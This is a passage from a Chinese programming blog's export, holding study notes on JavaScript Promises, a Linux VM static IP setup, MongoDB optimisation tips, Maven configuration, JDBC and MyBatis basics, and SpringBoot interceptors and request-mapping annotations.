class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Second&quot;</span>);</span><br><span class="line">            resolve();</span><br><span class="line">        &#125;, <span class="number">4000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Third&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<font color="#ff0000"> Promise 将嵌套格式的代码变成了顺序格式的代码。</font>

]]></content>
      <categories>
        <category>前端学习</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux虚拟机网络配置</title>
    <url>/post/f05f2e38.html</url>
    <content><![CDATA[<p>　　每次新建完虚拟机之后忘记快照，都得重新安装虚拟机并且配置网络，把配置过程记录在这里。<span id="more"></span></p>
<p><strong>1.VMware选择NAT模式</strong></p>
<p><strong>2.在虚拟机中操作</strong></p>
<p><code>vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
<p>根据IP修改为以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet #网络类型</span><br><span class="line">BOOTPROTO=none #IP获取方式，有dhcp自动获取和静态IP（none/static）</span><br><span class="line">NAME=ens33 #网络名称</span><br><span class="line">UUID=d1755a41-8026-42f1-871d-9cd78fa2aa3c </span><br><span class="line">DEVICE=ens33 #驱动名称</span><br><span class="line">ONBOOT=yes #设置开机启动</span><br><span class="line">IPADDR=192.168.137.3 #设置静态IP地址</span><br><span class="line">NETMASK=255.255.255.0 #子网掩码</span><br><span class="line">GATEWAY=192.168.137.254 #网关</span><br><span class="line">DNS1=114.114.114.114 #DNS</span><br><span class="line">DNS2=202.96.134.133</span><br></pre></td></tr></table></figure>
<p>保存退出后重启网络服务</p>
<p><code>systemctl restart network.service</code></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Java集合继承结构</title>
    <url>/post/cb9bdb06.html</url>
    <content><![CDATA[<p>　　集合这部分只是很杂乱，这个是搜集的一些资料，很清楚的梳理了集合知识和各个集合类型的特点<span id="more"></span></p>
<p><img src="https://s3.ax1x.com/2020/12/13/reBQmt.png" alt="reBQmt.png"></p>
<p><img src="https://s3.ax1x.com/2020/12/13/reBKOI.png" alt="reBKOI.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB优化</title>
    <url>/post/6276869c.html</url>
    <content><![CDATA[<p>　　MongoDB 是高性能数据，但是在使用的过程中，大家偶尔还会碰到一些性能问题。MongoDB和其它关系型数据库相比，例如 SQL Server 、MySQL 、Oracle 相比来说，相对较新，很多人对其不是很熟悉，所以很多开发、DBA往往是注重功能的实现，而忽视了性能的要求。其实，MongoDB和 SQL Server 、MySQL 、Oracle 一样，一个 数据库对象的设计调整、索引的创建、语句的优化，都会对性能产生巨大的影响。<span id="more"></span></p>
<p>为充分挖掘MongoDB性能，简单列举以下Mongodb优化方式：</p>
<ol>
<li><p>文档中的_id键推荐使用默认值，禁止向_id中保存自定义的值。<br>​解读： MongoDB文档中都会有一个“_id”键，默认是个ObjectID对象（标识符中包含时间戳、机器ID、进程ID和计数器）。MongoDB在指定_id与不指定_id插入时 速度相差很大，指定_id会减慢插入的速率。<br>  ​</p>
</li>
<li><p>推荐使用短字段名。<br>解读：与关系型数据库不同，MongoDB集合中的每一个文档都需要存储字段名，长字段名会需要更多的存储空间。</p>
<p>​</p>
</li>
<li><p>MongoDB索引可以提高文档的查询、更新、删除、排序操作，所以结合业务需求，适当创建索引。</p>
</li>
</ol>
<ol>
<li>每个索引都会占用一些空间，并且导致插入操作的资源消耗，因此，建议每个集合的索引数尽量控制在5个以内。</li>
</ol>
<ol>
<li><p>对于包含多个键的查询，创建包含这些键的复合索引是个不错的解决方案。复合索引的键值顺序很重要，理解索引最左前缀原则。<br>解读：例如在test集合上创建组合索引{a:1,b:1,c:1}。执行以下7个查询语句：<br>  db.test.find({a:”hello”}) // 1<br>  db.test.find({b:”sogo”, a:”hello”}) // 2<br>  db.test.find({a:”hello”,b:”sogo”, c:”666”}) // 3<br>  db.test.find({c:”666”, a:”hello”}) // 4<br>  db.test.find({b:”sogo”, c:”666”}) // 5<br>  db.test.find({b:”sogo” }) // 6<br>  db.test.find({c:”666”}) // 7<br>  以上查询语句可能走索引的是1、2、3、4<br>  查询应包含最左索引字段，以索引创建顺序为准，与查询字段顺序无关。<br>  最少索引覆盖最多查询。</p>
<p>​</p>
</li>
<li><p>TTL 索引（time-to-live index，具有生命周期的索引），使用TTL索引可以将超时时间的文档老化，一个文档到达老化的程度之后就会被删除。<br>解读：创建TTL的索引必须是日期类型。TTL索引是一种单字段索引，不能是复合索引。TTL删除文档后台线程每60s移除失效文档。不支持定长集合。</p>
<p>​</p>
</li>
<li><p>需要在集合中某字段创建索引，但集合中大量的文档不包含此键值时，建议创建稀疏索引。<br>解读：索引默认是密集型的，这意味着，即使文档的索引字段缺失，在索引中也存在着一个对应关系。在稀疏索引中，只有包含了索引键值的文档才会出现。</p>
<p>​</p>
</li>
<li><p>创建文本索引时字段指定text，而不是1或者-1。每个集合只有一个文本索引，但是它可以为任意多个字段建立索引。<br>解读：文本搜索速度快很多，推荐使用文本索引替代对集合文档的多字段的低效查询。</p>
<p>​</p>
</li>
<li><p>使用findOne在数据库中查询匹配多个项目，它就会在自然排序文件集合中返回第一个项目。如果需要返回多个文档，则使用find方法。</p>
</li>
</ol>
<ol>
<li><p>如果查询无需返回整个文档或只是用来判断键值是否存在，可以通过投影（映射）来限制返回字段，减少网络流量和客户端的内存使用。<br>  解读：既可以通过设置{key:1}来显式指定返回的字段，也可以设置{key:0}指定需要排除的字段。</p>
<p>​</p>
</li>
<li><p>除了前缀样式查询，正则表达式查询不能使用索引，执行的时间比大多数选择器更长，应节制性地使用它们。</p>
</li>
</ol>
<ol>
<li>批量插入（batchInsert）可以减少数据向服务器的提交次数，提高性能。但是批量提交的BSON Size不超过48MB。</li>
</ol>
<ol>
<li>禁止一次取出太多的数据进行排序，MongoDB目前支持对32M以内的结果集进行排序。如果需要排序，请尽量限制结果集中的数据量。</li>
</ol>
]]></content>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven环境变量配置</title>
    <url>/post/4bd31b3a.html</url>
    <content><![CDATA[<p>　　maven的仓库镜像配置的本地仓库配置<span id="more"></span></p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>maven下载地址：<a href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p>
<p><img src="https://www.runoob.com/wp-content/uploads/2018/09/750D721E-0624-4C16-AD4B-9EA5D7F6289A.png" alt="img"></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="1-首先查看java安装"><a href="#1-首先查看java安装" class="headerlink" title="1.首先查看java安装"></a>1.首先查看java安装</h2><p>打开dos命令窗口输入java -version，如果没有配置，见<a href="/post/a1cef01a.html" title="java环境变量配置">java环境变量配置</a></p>
<p><img src="https://s3.ax1x.com/2020/11/19/DKtiY6.jpg" alt="DKtiY6.jpg"></p>
<h2 id="2-设置Maven环境变量"><a href="#2-设置Maven环境变量" class="headerlink" title="2.设置Maven环境变量"></a>2.设置Maven环境变量</h2><p>右键 “计算机”，选择 “属性”，之后点击 “高级系统设置”，点击”环境变量”，来设置环境变量，有以下系统变量需要配置：</p>
<p>1.新建系统变量 <strong>MAVEN_HOME</strong>，变量值：maven安装路径</p>
<p>以下是我的安装路径</p>
<p><img src="https://s3.ax1x.com/2020/11/19/DK8GZt.jpg" alt="DK8GZt.jpg"></p>
<p>2.编辑系统变量 <strong>Path</strong>，添加变量值：;%MAVEN_HOME%\bin</p>
<p><img src="https://s3.ax1x.com/2020/11/19/DK83qI.jpg" alt="DK83qI.jpg"></p>
<h2 id="3-检测是否配置成功"><a href="#3-检测是否配置成功" class="headerlink" title="3.检测是否配置成功"></a>3.检测是否配置成功</h2><p>在控制台输入如下命令，如果能看到 Maven 相关版本信息，则说明 Maven 已经安装成功：</p>
<p>mvn -v</p>
<p><img src="https://s3.ax1x.com/2020/11/19/DK8JdP.jpg" alt="DK8JdP.jpg"></p>
<h2 id="4-maven镜像"><a href="#4-maven镜像" class="headerlink" title="4.maven镜像"></a>4.maven镜像</h2><p>找到maven文件下的conf文件夹，打开用记事本setting.xml</p>
<p>找到</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在下面添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>自己建的仓库路径<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure>
<font color="FF0000">D:\JavaTools\Maven\Mavenrespository是我的路径</font>

<p><img src="https://s3.ax1x.com/2020/12/03/D71VEQ.jpg" alt="D71VEQ.jpg"></p>
<p>由于maven搜索下载全球的global仓库是在外国搭建，不稳定，所以更换镜像，使maven的加载速度提高。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>找到下图所示的位置，将以上代码插入在红色方框中间</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMGTsJ.jpg" alt="DMGTsJ.jpg"></p>
<h2 id="5-idea中配置maven"><a href="#5-idea中配置maven" class="headerlink" title="5.idea中配置maven"></a>5.idea中配置maven</h2><p>打开file-Setting</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCY4g.jpg" alt="DtCY4g.jpg" style="zoom: 67%;" /></p>
<h1 id="创建maven-web项目（可忽略）"><a href="#创建maven-web项目（可忽略）" class="headerlink" title="创建maven web项目（可忽略）"></a>创建maven web项目（可忽略）</h1><p>打开File-New-Project，<font color="ff0000">注意有两个webapp选项不要选错</font></p>
<p>点击NEXT</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCJUS.jpg" alt="DtCJUS.jpg" style="zoom:67%;" /></p>
<p>点击NEXT，GroupId一般填写域名（com），ArtifactId一般填写姓名简拼</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCMjI.jpg" alt="DtCMjI.jpg"></p>
<p>添加的配置为archetypeCatalog=internal</p>
<p>点击NEXT</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCGE8.jpg" alt="DtCGE8.jpg" style="zoom:67%;" /></p>
<p>点击NEXT</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtClut.jpg" alt="DtClut.jpg" style="zoom:67%;" /></p>
<p>点击Finish后项目开始创建在右下角查看进度</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtC3Hf.jpg" alt="DtC3Hf.jpg"></p>
<h1 id="maven-web模板项目结构介绍"><a href="#maven-web模板项目结构介绍" class="headerlink" title="maven web模板项目结构介绍"></a>maven web模板项目结构介绍</h1><p><img src="https://s3.ax1x.com/2020/11/24/DtC1DP.jpg" alt="DtC1DP.jpg"></p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtC0uq.jpg" alt="DtC0uq.jpg"></p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCdvn.jpg" alt="DtCdvn.jpg"></p>
<p>同样在main下新建test测试文件夹，再在此文件下下新建java测试源码文件夹和resource测试资源文件加夹。</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCNCQ.jpg" alt="DtCNCQ.jpg"></p>
<p>也可以右键项目-选择Open Module Settings打开项目配置页面更改</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCU3j.jpg" alt="DtCU3j.jpg" style="zoom:67%;" /></p>
<p>配置依赖jar包</p>
<p><img src="https://s3.ax1x.com/2020/11/24/DtCags.jpg" alt="DtCags.jpg" style="zoom:67%;" /></p>
<p>以后需要什么jar包就可以直接导入依赖，如果不知道版本，在<a href="https://mvnrepository.com/">点击这里</a>搜索需要的Jar包，以下是导入步骤</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reQNQg.jpg" alt="reQNQg.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/12/13/reQtSS.jpg" alt="reQtSS.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/12/13/reQJW8.jpg" alt="reQJW8.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/12/13/reQUyQ.jpg" alt="reQUyQ.jpg"></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>创建项目</tag>
        <tag>Maven</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>MyBatis框架</title>
    <url>/post/669b9acc.html</url>
    <content><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="1-1-三层架构"><a href="#1-1-三层架构" class="headerlink" title="1.1 三层架构"></a>1.1 三层架构</h2><div class="table-container">
<table>
<thead>
<tr>
<th>架构层</th>
<th style="text-align:left">作用</th>
<th>对应的包</th>
<th>对应的处理框架</th>
</tr>
</thead>
<tbody>
<tr>
<td>界面层</td>
<td style="text-align:left">和用户打交道的，接受用户的请求参数，显示处理结果（jsp，html，servlet）</td>
<td>controller包（servlet）</td>
<td>springmvc</td>
</tr>
<tr>
<td>业务逻辑层</td>
<td style="text-align:left">接受了界面层传递的数据，计算逻辑，调用数据库，获取数据</td>
<td>service包（XXXService类）</td>
<td>spring</td>
</tr>
<tr>
<td>数据访问层</td>
<td style="text-align:left">访问数据库，执行对数据的查询，修改，删除等的等等</td>
<td>dao包（XXXDao）</td>
<td>mybatis</td>
</tr>
</tbody>
</table>
</div>
<span id="more"></span>三层中类的交互：用户使用界面层-->业务逻辑层-->数据访问层（持久层）-->数据库（mysql）

## 1.2 JDBC编程

### 1.2.1 JDBC编程的回顾

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fidStudent</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//注册mysql驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//连接数据库的基本信息url，username，password</span></span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://localhost:3306/springdb&quot;</span>;</span><br><span class="line">        String username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//创建连接对象</span></span><br><span class="line">        conn = DriverManager.getConnection(url,username,password);</span><br><span class="line">        <span class="comment">//保存查询结果</span></span><br><span class="line">        List&lt;Student&gt; stuList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建Statement，用来执行sql语句</span></span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line">        <span class="comment">//执行查询，创建记录集</span></span><br><span class="line">        rs = stmt.executeQuery(<span class="string">&quot;select * from student&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">            stu.setId(rs.getInt(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            stu.setName(rs.getString(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            <span class="comment">//从数据库取出数据转为Student对象，封装到List集合</span></span><br><span class="line">            stuList.add(stu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//关闭资源</span></span><br><span class="line">            <span class="keyword">if</span>(rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-2-使用JDBC的缺陷"><a href="#1-2-2-使用JDBC的缺陷" class="headerlink" title="1.2.2 使用JDBC的缺陷"></a>1.2.2 使用JDBC的缺陷</h3><p>1.代码比较多，开发效率低</p>
<p>2.需要关注Connection，Statement，ResultSet对象的创建和销毁</p>
<p>3.对ResultSet查询的结果，需要自己封装为List</p>
<p>4.代码重复高</p>
<p>5.业务代码和数据库操作混在一起</p>
]]></content>
  </entry>
  <entry>
    <title>SpringBoot-拦截器</title>
    <url>/post/e3a97206.html</url>
    <content><![CDATA[<p>　　SpringBoot学习，主要内容是拦截器，可以实现网站的登录功能<span id="more"></span></p>
<h1 id="1-实现登录拦截"><a href="#1-实现登录拦截" class="headerlink" title="1.实现登录拦截"></a>1.实现登录拦截</h1><p>　　首先需要编写相应模块的类实现HandlerInterceptor，然后再拦截配置类里面编辑要拦截胡页面。</p>
<h2 id="1-1-编写类实现HandlerInterceptor类"><a href="#1-1-编写类实现HandlerInterceptor类" class="headerlink" title="1.1 编写类实现HandlerInterceptor类"></a>1.1 编写类实现HandlerInterceptor类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//编写业务拦截的规则</span></span><br><span class="line">        <span class="comment">//从session中获取用户的信息</span></span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户是否登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == user) &#123;</span><br><span class="line">            <span class="comment">//未登录</span></span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/nologin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>　　实现HanderInterceptor，重写preHandle、postHandle、afterCompletion三个方法，先获取session的用户信息，然后判断是否登录。</p>
<h2 id="1-2-声明拦截配置类"><a href="#1-2-声明拦截配置类" class="headerlink" title="1.2 声明拦截配置类"></a>1.2 声明拦截配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//定义此类为配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//要拦截user下的所有访问请求，必须用户登录后才能访问</span></span><br><span class="line">        String[] addPathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//排除路径，排除的路径说明不需要用户登录也可以访问</span></span><br><span class="line">        String[] excludePathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/out&quot;</span>,<span class="string">&quot;/user/error&quot;</span>,<span class="string">&quot;/user/login&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> UserInterceptor()).addPathPatterns(addPathPatterns).excludePathPatterns(excludePathPatterns);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>　　需要实现WebMvcConfigurer，重写addInterceptors方法，在里面配置需要拦截的请求和排除的请求。</p>
<h2 id="1-3-编写Controller类进行验证"><a href="#1-3-编写Controller类进行验证" class="headerlink" title="1.3 编写Controller类进行验证"></a>1.3 编写Controller类进行验证</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="comment">//将user用户存入session</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">1001</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        request.getSession().setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login SUCCESS&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功才能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/center&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">center</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Center Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不用登录就能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/out&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Out Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果用户未登录访问了需要登录才可访问的请求，才会出错</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">error</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2-在SpringBoot框架下使用Servlet"><a href="#2-在SpringBoot框架下使用Servlet" class="headerlink" title="2.在SpringBoot框架下使用Servlet"></a>2.在SpringBoot框架下使用Servlet</h1><ul>
<li><p>第一种方式</p>
<p>在主程序入口处加上@ServletComponentScan注解，然后正常使用@WebServlet注解</p>
</li>
<li><p>第二种方式</p>
<p>使用@Configuration注解定义一个配置类</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SpringBoot学习</category>
      </categories>
      <tags>
        <tag>SpringBoot学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot-请求方式注解</title>
    <url>/post/6cd03ce5.html</url>
    <content><![CDATA[<p>　　主要是在开发过程中，如何区别各种请求类型，还有RESTful风格的了解<span id="more"></span></p>
<h1 id="1-注解"><a href="#1-注解" class="headerlink" title="1.注解"></a>1.注解</h1><h2 id="1-1-RestController"><a href="#1-1-RestController" class="headerlink" title="1.1 @RestController"></a>1.1 @RestController</h2><p>　　相当于控制层类加上@Controller+方法上加@ResponseBody ，意味着当前控制层类中所有方法返还的都是JSON对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@Controller</span></span><br><span class="line"><span class="comment">//相当于控制层类加上@Controller+方法上加@ResponseBody</span></span><br><span class="line"><span class="comment">//意味着当前控制层类中所有方法返还的都是JSON对象</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line"><span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        student.setId(<span class="number">1011</span>);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-GetMapping查"><a href="#1-2-GetMapping查" class="headerlink" title="1.2 @GetMapping查"></a>1.2 @GetMapping查</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    查询数据使用</span></span><br><span class="line"><span class="meta">@GetMapping(value = &quot;/queryStudentById2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">queryStudentById2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Only GET Method&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-3-PostMapping增"><a href="#1-3-PostMapping增" class="headerlink" title="1.3 @PostMapping增"></a>1.3 @PostMapping增</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/insert&quot;)</span></span><br><span class="line"><span class="comment">//    新增数据使用</span></span><br><span class="line"><span class="comment">//    该注解通常在新增数据的时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">insert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Insert success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
